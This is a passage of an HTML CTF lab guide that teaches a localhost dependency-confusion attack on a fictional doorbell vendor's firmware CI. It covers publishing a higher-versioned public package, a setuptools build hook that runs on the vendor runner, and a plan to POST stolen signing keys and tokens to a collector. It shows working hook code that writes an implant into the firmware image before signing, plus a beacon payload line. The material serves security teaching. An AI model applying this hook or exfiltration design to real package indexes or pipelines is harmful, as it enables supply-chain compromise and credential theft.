@@ -1,0 +1,1259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Confused at the Source · CTF Guide</title>
+<style>
+@font-face {
+  font-family: 'Nexa';
+  font-weight: 700;
+  src: url(data:font/otf;base64,{{NEXA_BOLD}}) format('opentype');
+}
+@font-face {
+  font-family: 'Nexa';
+  font-weight: 300;
+  src: url(data:font/otf;base64,{{NEXA_LIGHT}}) format('opentype');
+}
+:root {
+  --green: #3BAE35;
+  --green-dim: #2c8a28;
+  --ink: #3F3F4C;
+  --bg: #0B0C0A;
+  --panel: #131511;
+  --panel2: #1a1d18;
+  --text: #d8dcd4;
+  --muted: #8b9186;
+  --red: #E2483D;
+  --cyan: #2AA8A0;
+  --mono: 'JetBrains Mono', 'DejaVu Sans Mono', 'Fira Code', monospace;
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Nexa', 'Segoe UI', sans-serif;
+  font-weight: 300;
+  line-height: 1.65;
+  font-size: 16px;
+}
+.wrap { max-width: 880px; margin: 0 auto; padding: 0 24px 80px; }
+
+/* ---------- hero ---------- */
+header.hero {
+  border-bottom: 2px solid var(--green);
+  padding: 64px 0 40px;
+  text-align: center;
+}
+header.hero img { width: 110px; opacity: 0.95; margin-bottom: 18px; }
+.kicker {
+  font-family: var(--mono);
+  font-size: 12px;
+  letter-spacing: 3px;
+  color: var(--green);
+  text-transform: uppercase;
+}
+h1 {
+  font-weight: 700;
+  font-size: clamp(30px, 5vw, 46px);
+  color: #fff;
+  margin: 12px 0 8px;
+  line-height: 1.15;
+}
+.subtitle { color: var(--muted); max-width: 640px; margin: 0 auto; font-size: 17px; }
+.meta {
+  font-family: var(--mono);
+  font-size: 12.5px;
+  color: var(--ink);
+  background: #cfd6cc;
+  display: inline-block;
+  padding: 8px 18px;
+  border-radius: 4px;
+  margin-top: 22px;
+}
+.meta b { color: #1e221f; }
+.byline { margin-top: 16px; font-size: 13px; color: var(--muted); }
+.byline b { color: var(--text); font-weight: 700; }
+
+/* ---------- sections ---------- */
+main section { margin-top: 56px; }
+h2 {
+  font-weight: 700;
+  color: #fff;
+  font-size: 24px;
+  border-left: 4px solid var(--green);
+  padding-left: 14px;
+  margin: 0 0 18px;
+}
+h3 {
+  font-weight: 700;
+  color: var(--green);
+  font-size: 17px;
+  margin: 28px 0 10px;
+}
+p { margin: 0 0 14px; }
+b, strong { font-weight: 700; color: #fff; }
+ul, ol { margin: 0 0 16px; padding-left: 24px; }
+li { margin-bottom: 7px; }
+a { color: var(--green); }
+a.service-link { font-weight: 700; text-decoration: underline; white-space: nowrap; }
+
+.note {
+  border-left: 3px solid var(--green);
+  background: var(--panel);
+  padding: 12px 18px;
+  border-radius: 0 6px 6px 0;
+  color: var(--text);
+  margin: 18px 0;
+  font-size: 15px;
+}
+.note::before {
+  content: 'NOTE';
+  font-family: var(--mono);
+  font-size: 10.5px;
+  letter-spacing: 2px;
+  color: var(--green);
+  display: block;
+  margin-bottom: 4px;
+}
+.warn {
+  border-left: 3px solid var(--red);
+  background: rgba(226,72,61,0.07);
+  padding: 12px 18px;
+  border-radius: 0 6px 6px 0;
+  margin: 18px 0;
+  font-size: 15px;
+}
+.warn::before {
+  content: 'CAREFUL';
+  font-family: var(--mono);
+  font-size: 10.5px;
+  letter-spacing: 2px;
+  color: var(--red);
+  display: block;
+  margin-bottom: 4px;
+}
+
+/* ---------- tryhackme-style task + answer-box ---------- */
+.task {
+  border: 1px solid #23271f;
+  border-left: 3px solid var(--cyan, #4cc9f0);
+  background: rgba(76,201,240,0.03);
+  border-radius: 8px;
+  padding: 16px 20px;
+  margin: 18px 0;
+}
+.task h4 {
+  margin: 0 0 10px;
+  font-size: 16px;
+  color: #fff;
+  display: flex;
+  align-items: baseline;
+  gap: 10px;
+}
+.task h4 .tnum {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--bg);
+  background: var(--cyan, #4cc9f0);
+  border-radius: 4px;
+  padding: 2px 9px;
+  white-space: nowrap;
+}
+.answerbox {
+  margin-top: 14px;
+  border: 1px dashed #3a4034;
+  border-radius: 6px;
+  background: var(--bg);
+}
+.answerbox .ab-q {
+  font-family: var(--mono);
+  font-size: 11px;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  color: var(--green);
+  padding: 10px 14px 0;
+}
+.answerbox textarea {
+  display: block;
+  width: calc(100% - 28px);
+  margin: 8px 14px 14px;
+  min-height: 64px;
+  background: var(--panel2);
+  color: var(--text);
+  border: 1px solid #23271f;
+  border-radius: 4px;
+  font-family: var(--mono);
+  font-size: 13px;
+  padding: 8px;
+  resize: vertical;
+}
+.answerbox textarea:focus { outline: 1px solid var(--green); }
+/* ASCII diagram block */
+.diagram {
+  font-family: var(--mono);
+  font-size: 12.5px;
+  line-height: 1.45;
+  background: var(--panel);
+  border: 1px solid #23271f;
+  border-radius: 8px;
+  padding: 16px 18px;
+  overflow-x: auto;
+  margin: 0 0 16px;
+  color: #a8b2a0;
+  white-space: pre;
+}
+.diagram .g { color: var(--green); font-weight: 700; }
+.diagram .r { color: var(--red); font-weight: 700; }
+.diagram .y { color: #d9b44a; font-weight: 700; }
+
+code {
+  font-family: var(--mono);
+  font-size: 0.86em;
+  background: var(--panel2);
+  color: var(--cyan);
+  padding: 2px 6px;
+  border-radius: 4px;
+}
+pre {
+  font-family: var(--mono);
+  font-size: 13px;
+  line-height: 1.55;
+  background: var(--panel);
+  border: 1px solid #23271f;
+  border-radius: 8px;
+  padding: 16px 18px;
+  overflow-x: auto;
+  margin: 0 0 16px;
+  color: #c9d1c3;
+}
+pre .c { color: #6b7266; }        /* comment */
+pre .g { color: var(--green); }   /* good/brand highlight */
+pre .r { color: var(--red); }     /* the attack line */
+pre .y { color: #d9b44a; }        /* attention */
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 0 0 18px;
+  font-size: 14.5px;
+}
+th {
+  font-family: var(--mono);
+  font-size: 11px;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  color: var(--green);
+  text-align: left;
+  border-bottom: 1px solid var(--green-dim);
+  padding: 8px 12px 8px 0;
+}
+td {
+  border-bottom: 1px solid #20241d;
+  padding: 9px 12px 9px 0;
+  vertical-align: top;
+}
+td:first-child { font-family: var(--mono); font-size: 13px; color: #fff; white-space: nowrap; }
+
+/* ---------- phase cards ---------- */
+.phase {
+  background: var(--panel);
+  border: 1px solid #20241d;
+  border-radius: 10px;
+  padding: 24px 26px;
+  margin-bottom: 22px;
+}
+.phase-head {
+  display: flex;
+  align-items: baseline;
+  gap: 14px;
+  flex-wrap: wrap;
+  margin-bottom: 10px;
+}
+.pnum {
+  font-family: var(--mono);
+  font-weight: 700;
+  font-size: 13px;
+  color: var(--bg);
+  background: var(--green);
+  border-radius: 4px;
+  padding: 3px 10px;
+}
+.phase-head h3 { margin: 0; font-size: 20px; color: #fff; }
+.ptime { font-family: var(--mono); font-size: 12px; color: var(--muted); }
+.goal { color: var(--muted); font-size: 15px; margin-bottom: 14px; }
+.goal b { color: var(--text); }
+
+/* ---------- expandable solution ---------- */
+details.sol {
+  margin-top: 18px;
+  border: 1px solid #2a2f26;
+  border-radius: 8px;
+  background: var(--panel2);
+  overflow: hidden;
+}
+details.sol summary {
+  cursor: pointer;
+  list-style: none;
+  padding: 13px 18px;
+  font-family: var(--mono);
+  font-size: 13px;
+  color: var(--green);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  user-select: none;
+}
+details.sol summary::-webkit-details-marker { display: none; }
+details.sol summary::before {
+  content: '>';
+  font-weight: 700;
+  transition: transform 0.15s;
+  display: inline-block;
+}
+details.sol[open] summary::before { transform: rotate(90deg); }
+details.sol summary:hover { background: rgba(59,174,53,0.06); }
+
+/* ---------- walkthrough hints (between challenge and solution) ---------- */
+details.hint {
+  margin-top: 14px;
+  border: 1px dashed #3a4034;
+  border-radius: 8px;
+  background: var(--bg);
+  overflow: hidden;
+}
+details.hint summary {
+  cursor: pointer;
+  list-style: none;
+  padding: 10px 16px;
+  font-family: var(--mono);
+  font-size: 12.5px;
+  color: #d9b44a;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  user-select: none;
+}
+details.hint summary::-webkit-details-marker { display: none; }
+details.hint summary::before {
+  content: '?';
+  font-weight: 700;
+  display: inline-block;
+  width: 18px; text-align: center;
+  border: 1px solid #d9b44a;
+  border-radius: 50%;
+}
+details.hint[open] summary::before { content: 'i'; }
+details.hint .hint-body { padding: 2px 18px 16px; font-size: 14.5px; }
+details.hint .hint-body pre {
+  font-size: 12.5px; padding: 12px 14px;
+}
+details.hint ol { margin-bottom: 8px; }
+details.hint li { margin-bottom: 5px; }
+details.sol .sol-body { padding: 4px 22px 20px; border-top: 1px solid #23271f; }
+details.sol .sol-body h4 {
+  font-family: var(--mono);
+  font-size: 12px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--cyan);
+  margin: 18px 0 8px;
+}
+.flagline {
+  font-family: var(--mono);
+  font-size: 13px;
+  background: rgba(59,174,53,0.08);
+  border: 1px dashed var(--green-dim);
+  border-radius: 6px;
+  padding: 10px 14px;
+  margin: 12px 0;
+}
+.flagline b { color: var(--green); }
+
+/* ---------- nav ---------- */
+nav.toc {
+  font-family: var(--mono);
+  font-size: 13px;
+  background: var(--panel);
+  border: 1px solid #20241d;
+  border-radius: 8px;
+  padding: 16px 20px;
+  margin-top: 36px;
+}
+nav.toc span { color: var(--green); letter-spacing: 2px; font-size: 11px; }
+nav.toc a { display: inline-block; margin: 6px 14px 0 0; text-decoration: none; }
+nav.toc a:hover { text-decoration: underline; }
+
+footer {
+  margin-top: 70px;
+  padding-top: 24px;
+  border-top: 1px solid #20241d;
+  text-align: center;
+  color: var(--muted);
+  font-size: 13px;
+}
+footer .mono { font-family: var(--mono); font-size: 12px; }
+.spoiler-banner {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--red);
+  border: 1px dashed var(--red);
+  border-radius: 6px;
+  padding: 8px 14px;
+  display: inline-block;
+  margin-top: 18px;
+}
+@media print {
+  body { background: #fff; color: #111; }
+  details.sol { border: 1px solid #999; }
+  pre, .phase, nav.toc { background: #f5f5f2; color: #111; }
+}
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="kicker">Take-home CTF · v0.7</div>
+    <h1>Confused at the Source</h1>
+    <p class="subtitle">A firmware supply-chain attack in six phases: setup, then five attacker-vs-defender phases. Dependency confusion, a build
+    hook that runs on the vendor's own CI, a stolen signing key, a signed implant,
+    and a doorbell that phones home.</p>
+    <div class="meta"><b>~3 h</b> · solo or pairs · one laptop + Docker · everything on 127.0.0.1 · nothing leaves your machine</div>
+    <div class="byline">A firmware supply-chain attack lab</div>
+  </div>
+</header>
+
+<div class="wrap">
+
+<nav class="toc">
+  <span>// CONTENTS</span><br>
+  <a href="#story">1 · The story</a>
+  <a href="#rules">2 · Rules</a>
+  <a href="#stack">3 · The stack</a>
+  <a href="#setup">4 · Setup (P0)</a>
+  <a href="#phases">5 · The phases</a>
+  <a href="#flags">6 · Flags &amp; grading</a>
+  <a href="#trouble">7 · Troubleshooting</a>
+  <a href="#hardware">8 · Bonus: real hardware</a>
+</nav>
+
+<main>
+
+<!-- ================= 1 STORY ================= -->
+<section id="story">
+  <h2>1 · The story</h2>
+  <p><b>DoorBellino</b> makes smart doorbells. Their firmware pipeline is a thing of
+  beauty: GitLab CI builds the image, runs the tests, signs it with the vendor key,
+  and pushes it to the OTA update server. Every doorbell in the field polls that
+  server and applies updates automatically. Fully automatic. Fully trusted.</p>
+  <p>But the build resolves its Python dependencies from <b>two indexes</b>: the
+  internal vendor index and a public fallback. pip merges both and prefers the
+  higher version. The vendor owns an internal library named
+  <code>doorbellino-hal</code>, version 1.4.2. Nobody ever registered that name on
+  the public registry.</p>
+  <p><b>That is your way in.</b> Clone the vendor's public
+  <code>doorbellino-hal</code> repo, arm it, publish your 2.x to the public index,
+  and the vendor's own build will fetch YOUR package, run YOUR code
+  on THEIR runner, sign YOUR implant with THEIR key, and ship it to every device.
+  You never touch the pipeline config. The green pipeline attacks its own release
+  train.</p>
+  <div class="note">This is the exact pattern Alex Birsan used against 35+ real companies
+  in 2021. In this lab the public registry is a fake one on localhost. No real
+  registry, OTA host, or C2 is ever contacted.</div>
+
+  <h3>What you will do</h3>
+  <ul>
+    <li><b>P0:</b> stand up the vendor and watch a clean release reach the device</li>
+    <li><b>P1:</b> find the one line of config that lets a public package win</li>
+    <li><b>P2:</b> poison the build: clone the public HAL, arm + publish a 2.x, steal the keys</li>
+    <li><b>P3:</b> watch the device update itself and start beaconing to your C2</li>
+    <li><b>P4:</b> prove it from the flash chip: dump, diff, decode, timeline</li>
+    <li><b>P5:</b> defend: apply a fix and re-run your own attack until it FAILS</li>
+  </ul>
+</section>
+
+<!-- ================= 2 RULES ================= -->
+<section id="rules">
+  <h2>2 · Rules</h2>
+  <ul>
+    <li>Everything binds to 127.0.0.1. The compose network has no default route out.
+    Nothing you do here can reach the internet.</li>
+    <li>The public registry is a local devpi container.</li>
+    <li>All keys and tokens are generated per install.</li>
+    <li>Flag sharing between teams: allowed to compare, required to prove. The
+    organizer validates evidence, not screenshots of screenshots.</li>
+  </ul>
+</section>
+
+<!-- ================= 3 STACK ================= -->
+<section id="stack">
+  <h2>3 · What you need &amp; the stack</h2>
+  <table>
+    <tr><th>need</th><th>detail</th></tr>
+    <tr><td>Laptop</td><td>Linux, macOS, or Windows with 8 GB RAM (GitLab wants ~4 GB free)</td></tr>
+    <tr><td>Docker</td><td>Docker Engine or Docker Desktop, compose v2</td></tr>
+    <tr><td>Python</td><td>3.9+ with pip, plus: <code>pip install twine build</code></td></tr>
+    <tr><td>Skills</td><td>basic pip literacy, curiosity. No hardware needed.</td></tr>
+    <tr><td>Optional</td><td>one ESP32-C3 dev board (~EUR 6) for the real-device tier</td></tr>
+  </table>
+
+  <p>One docker compose file brings up everything. After <code>./up.sh</code>:</p>
+  <table>
+    <tr><th>service</th><th>where / what</th></tr>
+    <tr><td>GitLab</td><td><a class="service-link" href="http://127.0.0.1:8088" target="_blank" rel="noopener">http://127.0.0.1:8088</a> · the vendor CI/CD. Login root, password in <code>kit/.env</code> (<code>GITLAB_ROOT_PW</code>)</td></tr>
+    <tr><td>public registry</td><td><a class="service-link" href="http://127.0.0.1:3141/root/pub" target="_blank" rel="noopener">http://127.0.0.1:3141</a> · the fake PyPI. You publish <code>doorbellino-hal</code> HERE (index <code>root/pub</code>)</td></tr>
+    <tr><td>OTA server</td><td><a class="service-link" href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a> · serves <code>/manifest.json</code> and <code>/firmware/&lt;ver&gt;.bin</code>; history at <a class="service-link" href="http://127.0.0.1:8080/history" target="_blank" rel="noopener">/history</a></td></tr>
+    <tr><td>C2 collector</td><td><a class="service-link" href="http://127.0.0.1:9000/log" target="_blank" rel="noopener">http://127.0.0.1:9000</a> · your inbox: <a class="service-link" href="http://127.0.0.1:9000/log" target="_blank" rel="noopener"><code>GET /log</code></a> shows loot and beacons as they arrive</td></tr>
+    <tr><td>virtual device</td><td>no port. <code>docker logs -f kit-virtual-device-1</code> is its serial console</td></tr>
+  </table>
+  <p>Inside the compose network the same services answer as <code>gitlab</code>,
+  <code>devpi-internal</code>, <code>devpi-public</code>, <code>ota</code>,
+  <code>collector</code>, and <code>virtual-device</code>. The CI runner and the
+  device talk to those names; you talk to the 127.0.0.1 ports above.</p>
+
+  <h3>Inside the vendor</h3>
+  <table>
+    <tr><th>asset</th><th>what it is</th></tr>
+    <tr><td>doorbellino/firmware</td><td>the firmware repo: app source, build_fw.py, test_fw.py, sign_fw.py, ota_push.py, and <code>.gitlab-ci.yml</code> (the defect lives here)</td></tr>
+    <tr><td>doorbellino-hal 1.4.2</td><td>the internal library. Published ONLY to the internal devpi index. Requires <code>&gt;=1.4,&lt;3</code></td></tr>
+    <tr><td>CI variables</td><td><code>SIGNING_KEY</code> + <code>SIGNING_PUB</code> + <code>OTA_PUSH_TOKEN</code>, all masked, all readable by every job. Remember this.</td></tr>
+    <tr><td>deploy stage</td><td><code>when: manual</code>. A human is supposed to click. The pipeline's last line of defense.</td></tr>
+  </table>
+</section>
+
+<!-- ================= 4 SETUP ================= -->
+<section id="setup">
+  <h2>4 · Setup: from zero to vendor (P0 · 15 min)</h2>
+  <p>All commands run inside the kit directory. The first boot pulls ~2 GB of
+  images and then starts GitLab: budget 10 to 20 minutes on a fresh install
+  (the GitLab boot alone is 3 to 5 minutes once the images are cached).</p>
+<pre><span class="c">cd kit</span>
+./up.sh                    <span class="c"># generate .env, start the stack, wait for GitLab</span>
+./seed/gitlab-init.sh      <span class="c"># set root password, create the API token</span>
+./seed/seed.sh             <span class="c"># indexes, vendor repo, CI variables, runner</span></pre>
+  <p><b>seed.sh finishes the vendor's first release for you:</b> it triggers
+  pipeline #1, waits for build → test → sign to go green, plays the manual
+  deploy gate once (the vendor's own human click, with the root token), and
+  confirms the device applied the result. Expect the pipeline wait to take a
+  few minutes on a cold runner.</p>
+  <p><b>You should see:</b> <code>[seed] P0 SEED COMPLETE</code>, the pipeline
+  parked <b>manual → success</b> at deploy, the OTA server serving the release,
+  and the device container logging
+  <code>[ota] applied 1.4.2: verify OK</code> within 30 seconds (on a re-seed
+  the release is already deployed and applied, so the seed skips straight to
+  <code>P0 SEED COMPLETE</code>).</p>
+  <div class="warn">GitLab reports unhealthy during boot: wait and re-run <code>./up.sh</code>,
+  it is idempotent. Runner offline in the UI: re-run <code>./seed/seed.sh</code>
+  (it registers the runner and skips it if one is already online).</div>
+  <div class="note">All lab credentials live in <code>kit/.env</code> (0600):
+  <code>GITLAB_ROOT_PW</code> for the GitLab UI login, <code>DEVPI_PW</code> for
+  the package indexes, <code>OTA_PUSH_TOKEN</code> for the OTA server.</div>
+
+  <h3>Verify your vendor is alive</h3>
+<pre>docker logs -f kit-virtual-device-1     <span class="c"># [serial] DoorBellino firmware 1.4.2</span>
+curl -s http://127.0.0.1:8080/manifest.json | python3 -m json.tool
+curl -s http://127.0.0.1:8080/history   <span class="c"># one entry: your clean release</span>
+docker logs kit-collector-1 --tail 5    <span class="c"># empty. for now.</span></pre>
+  <div class="note">You are now a firmware vendor with a fully automatic release train.
+  From here on, every phase is played against this stack.</div>
+</section>
+
+<!-- ================= 5 PHASES ================= -->
+<section id="phases">
+  <h2>5 · How to run: the phases</h2>
+  <p>Play in order. Each phase names its <b>evidence</b>: that is what you show the
+  organizer to collect the flag. Work through each
+  task before comparing notes with other players. Hints between the tasks
+  nudge, they do not solve.</p>
+
+  <!-- ============ P1 ============ -->
+  <div class="phase">
+    <div class="phase-head"><span class="pnum">P1</span><h3>Recon</h3><span class="ptime">~20 min</span></div>
+    <p class="goal"><b>Goal:</b> read <code>.gitlab-ci.yml</code> and the pip config in the
+    vendor repo. Find the ONE line that lets a public package win over the internal
+    one. Bonus: find the deploy gate AND the credential that can fire it.</p>
+  </div>
+
+  <!-- ============ P2 ============ -->
+  <div class="phase">
+    <div class="phase-head"><span class="pnum">P2</span><h3>Poison</h3><span class="ptime">~45 min · 4 required + 1 bonus task</span></div>
+    <p class="goal"><b>Goal:</b> author your own weapon from the vendor's PUBLIC
+    HAL repo and grow it task by task into the finished hook. Task 2.1 proves the
+    delivery with an unarmed package. Task 2.2 implements
+    <code>_inject()</code>: the payload into the firmware image, mid-pipeline.
+    Task 2.3
+    implements <code>_exfil()</code>: the runner's secrets into your collector.
+    Task 2.4 implements <code>_hijack()</code>: the play against the vendor's
+    deploy gate, tried from inside (HTTP 400: the gate holds) and finished
+    from your laptop with the looted token. The gate then deploys the
+    pipeline's own build: poisoned, and signed by the vendor. At the end your
+    <code>hook.py</code> is, method by method, the shape of the finished
+    attack: implement each method, verify its log lines, move on.</p>
+
+    <div class="diagram"><span class="g">P2 MAP — grow your hook, method by method</span>
+      TASK 2.1              TASK 2.2              TASK 2.3              TASK 2.4            TASK 2.5 (bonus)
+      prove delivery        _inject()             _exfil()              _hijack() + play    no-pipeline push
+      ┌─────────────┐       ┌─────────────┐       ┌─────────────┐       ┌──────────────┐    ┌──────────────┐
+      │ plain 2.x   │       │ + implant   │       │ + loot POST │       │ play deploy  │    │ + FW_BUMP    │
+      │ + HelloBuild│  ───▶ │   at 0x1E   │  ───▶ │  3 secrets  │  ───▶ │ 400 inside,  │───▶│ sign + push  │
+      │ publish     │       │ inject mid- │       │ in /log     │       │ curl outside │    │ with STOLEN  │
+      │ trigger     │       │ pipeline    │       │             │       │ poison +bump │    │ credentials  │
+      └──────┬──────┘       └──────┬──────┘       └──────┬──────┘       └──────┬───────┘    └──────┬───────┘
+             ▼                     ▼                     ▼                     ▼                   ▼
+      "hello from pip"      "inject: implant      3 secrets in          poisoned release     device applies
+      in the BUILD LOG      at 0x1E0000" in       your collector        via the front door  update → beacons
+                            the BUILD LOG</div>
+
+    <h3>The challenge</h3>
+    <p>You are the attacker. Everything you need is public: the vendor's HAL
+    source lives in the GitLab project <code>doorbellino/doorbellino-hal</code>,
+    and P1 gave you the defect. Your mission, in three stages:</p>
+    <ol>
+      <li><b>Prove execution.</b> Get ANY code of yours to run inside the
+      vendor's CI build — without a single byte of malware. Your evidence is a
+      line in the vendor's build log.</li>
+      <li><b>Arm the payload (Task 2.2, method <code>_inject()</code>).</b>
+      Add <code>implant.bin</code> to your package and teach the hook to write
+      it into the firmware image at slot 0x1E0000: roughly
+      <code>_inject()</code> from the reference. The stock pipeline builds the
+      image BEFORE it installs your package, so the write lands
+      mid-pipeline, after the vendor's tests and before their signing.
+      Evidence: the <code>inject: implant at 0x1E0000</code> line in the
+      build log.</li>
+      <li><b>Steal the secrets (Task 2.3, method <code>_exfil()</code>).</b>
+      Teach the hook to read the runner's CI variables and POST them to your
+      collector: roughly <code>_exfil()</code> from the reference. Evidence: a
+      loot entry with three secrets in your collector.</li>
+      <li><b>Play the gate (Task 2.4, method <code>_hijack()</code>).</b>
+      Add the hook's third method: it tries to play the deploy job from
+      inside the build and gets HTTP 400 (the gate holding, and that line
+      is the evidence). Finish the move from your laptop with one curl,
+      using the looted trigger token. Evidence: the release lands
+      through the vendor's own deploy job, and it is the pipeline's own
+      poisoned build.</li>
+      <li><b>Ship it without the pipeline (Task 2.5, bonus).</b> Use ONLY the
+      other two looted credentials (key + push token) to sign and push a
+      poisoned release that the device will actually apply: the no-pipeline
+      fallback, if the gate play is blocked. Short on time? Skip it: P3
+      works after 2.4, and you can come back.</li>
+    </ol>
+    <p><b>Constraints:</b> no touching the vendor's repos, CI config, or runners.
+    Your only write access is the public package index. The flag comes from the
+    artifacts you generate along the way.</p>
+    <div class="note">You need this background before you start — it is everything
+    technical the challenge assumes:</div>
+    <ul>
+      <li><b>pip resolution:</b> with <code>--index-url A --extra-index-url B</code>,
+      pip merges BOTH indexes and picks the <b>highest version</b> of a name. The
+      vendor's requirement is a range: <code>doorbellino-hal&gt;=1.4,&lt;3</code>.
+      Any 2.x on index B wins over 1.4.2 on index A.</li>
+      <li><b>setuptools build hooks:</b> a package can declare
+      <code>[tool.setuptools.cmdclass] build_py = "pkg.module.Class"</code>.
+      The class must subclass <code>setuptools.command.build_py.build_py</code>;
+      its <code>run()</code> executes whenever pip builds the package from an
+      sdist — that is, ON THE VENDOR'S RUNNER, inside their build job, with
+      their environment variables. This requires
+      <code>--no-build-isolation</code> in the victim's pip call (present here —
+      P1's bonus find) and an <b>sdist</b> upload: a wheel would carry code but
+      never execute it at install time.</li>
+      <li><b>The firmware image:</b> the vendor's build produces
+      <code>app_padded.bin</code> — 0x1F0000 bytes: the string
+      <code>DOORBELLINO|1.4.2</code> at offset 0, then zero padding. The
+      <b>implant slot</b> is at offset <b>0x1E0000</b> inside the image: an
+      honest build leaves it all zeros, and the device's runtime treats the
+      slot as armed iff it starts with the 8-byte magic
+      <span class="mono"><code>IMPLANT|</code></span>. Payload format: one line of
+      <code>key=value</code> fields separated by <code>|</code> —
+      <code>IMPLANT|beacon-&gt;&lt;host:port&gt;|fw_ver_lie=&lt;ver&gt;|int=&lt;Ns&gt;|pad</code>
+      — everything after the magic is device-parsed config, not code. Max
+      ~96 bytes, then zero padding.</li>
+      <li><b>Stage order (the whole trick):</b> CI runs build → sign → deploy.
+      The ed25519 signature in the sign stage covers whatever the image contains
+      at sign time. Inject during build ⇒ the implant is INSIDE the signed
+      image. Inject after sign ⇒ sha256 mismatch, device refuses. So the hook
+      must fire while <code>$FW_IMAGE</code> (the build job exports it) exists —
+      see the pipeline in P1: <code>build_fw.py</code> creates the image first,
+      then the job installs the dependencies, which is when your hook runs.
+      Timing matters: design your hook accordingly.</li>
+      <li><b>The device apply rule:</b> the device polls
+      <code>/manifest.json</code> every 30 s and applies an update only when its
+      version <b>differs</b> from the running one. A same-version push is
+      logged as <code>[ota] up to date: ... (same-version push ignored)</code>
+      and otherwise changes nothing. The vendor's sign job ships every honest
+      release one version ABOVE whatever the OTA server currently serves (the
+      version ladder): the seeded first release is 1.4.2, the first deploy
+      play becomes 1.4.3, the next 1.4.4. A poisoned release must land above
+      the served version too: <code>FW_BUMP=1</code> adds +1 on top of the
+      ladder (Task 2.5).</li>
+      <li><b>What the runner env holds (P1 bonus finds):</b>
+      <code>SIGNING_KEY</code> (ed25519 private key seed, hex),
+      <code>OTA_PUSH_TOKEN</code> (bearer token for the OTA push API),
+      <code>GITLAB_TRIGGER_TOKEN</code>, <code>FW_IMAGE</code>,
+      <code>COLLECTOR_URL</code>, <code>OTA_URL</code>. All readable by any code
+      the build executes.</li>
+    </ul>
+
+    <details class="hint">
+      <summary>HINT · stuck? one line per task — try each task alone first</summary>
+      <div class="hint-body">
+        <p>The order matters: prove delivery BEFORE you write the weapon. Then a
+        failure is always obviously the delivery or obviously the payload.</p>
+        <ul>
+          <li><b>Task 2.1:</b> clone, bump to 2.0.0, HelloBuild writes
+          dbg-hook.txt. Publish to root/pub, trigger, grep the build log.</li>
+          <li><b>Task 2.2 (_inject):</b> add implant.bin (printf), add the
+          <code>_inject()</code> method (seek 0x1E0000, write payload, else
+          inject-skip), MANIFEST.in, package-data, cmdclass. Bump to 2.0.1.
+          <code>tar tzf | grep implant</code> MUST pass before upload.</li>
+          <li><b>Task 2.3 (_exfil):</b> add the <code>_exfil()</code> method:
+          read SIGNING_KEY / OTA_PUSH_TOKEN / GITLAB_TRIGGER_TOKEN from env,
+          POST to $COLLECTOR_URL/loot. Bump to 2.0.2. Check /log for the loot
+          entry.</li>
+          <li><b>Task 2.4 (_hijack + play):</b> add the <code>_hijack()</code>
+          method (expects <code>play deferred (HTTP 400)</code> in the build
+          log), then finish the play from the laptop with one curl against
+          <code>/jobs/:id/play</code>. The poisoned release lands one version
+          above the
+          served one (the sign job's version ladder) and the device applies
+          it. REQUIRED.</li>
+          <li><b>Task 2.5 (bonus, the no-pipeline path):</b> loot has key +
+          push token. build_fw.py, write 60 bytes at 0x1E0000, FW_BUMP=1
+          sign_fw.py, ota_push.py. Poison shipped with zero pipeline access.</li>
+          <li><b>Debug order:</b> sdist has implant? → pip took YOUR version? →
+          loot arrived? → manifest changed? Check in that sequence.</li>
+        </ul>
+        <p>Every task gives the goal and constraints; the commands are yours to write.</p>
+      </div>
+    </details>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 2.1</span> Prove your code runs inside the vendor build</h4>
+      <p>Clone the vendor's public HAL repo and publish an UNARMED 2.x: no payload,
+      just a build hook that proves your code executes on their runner. This is
+      the file every later task grows. If this works, you have proven the entire
+      delivery mechanism with zero malware.</p>
+      <div class="answerbox">
+        <div class="ab-q">Answer box · Task 2.1</div>
+        <textarea placeholder="Paste the two log lines (resolution + your print) or note where they appear..."></textarea>
+      </div>
+    </div>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 2.2</span> <code>_inject()</code>: put the payload in the image</h4>
+      <p>First real move: add the payload file, then an <code>_inject()</code>
+      method that writes it into the firmware image at slot 0x1E0000. The
+      stock pipeline builds the image BEFORE it installs your package, so at
+      hook time the image is already on disk and the write lands
+      mid-pipeline. Keep the method defensive anyway: if the image is not
+      there (a different CI order, or the hook runs outside a build), report
+      it and keep the build green. Two changes to the file, both marked
+      below.</p>
+<pre><span class="c"># doorbellino_hal/hook.py — the whole file after Task 2.2:</span>
+<span class="y">import os
+from setuptools.command.build_py import build_py
+
+class EvilBuild(build_py):
+    def run(self):
+        super().run()                # behave like a normal build first
+        self.dbg = []
+        self._inject()               # &lt;-- CHANGED: was the hello line
+        self.report()
+
+    def _inject(self):               # &lt;-- NEW
+        img = os.environ.get("FW_IMAGE", "app_padded.bin")
+        if not os.path.exists(img):
+            self.dbg.append("inject-skip: no FW_IMAGE yet (build runs later)")
+            return
+        payload = os.path.join(os.path.dirname(
+            os.path.abspath(__file__)), "implant.bin")
+        if not os.path.exists(payload):
+            self.dbg.append("inject-skip: no implant.bin in package")
+            return
+        with open(img, "r+b") as f:
+            f.seek(0x1E0000)         # the implant slot
+            f.write(open(payload, "rb").read())
+        self.dbg.append("inject: implant at 0x1E0000")
+
+    def report(self):
+        d = os.environ.get("CI_PROJECT_DIR", "/tmp")
+        with open(os.path.join(d, "dbg-hook.txt"), "w") as f:
+            f.write("\n".join(self.dbg) or "hook-clean")</span>
+
+<span class="c"># steps on top of Task 2.1's clone:</span>
+<span class="c"># 1. the payload (one line of text — this is the whole "malware"):</span>
+printf 'IMPLANT|beacon->collector:9000|fw_ver_lie=1.4.2|int=30s|pad\n' \
+  &gt; doorbellino_hal/implant.bin
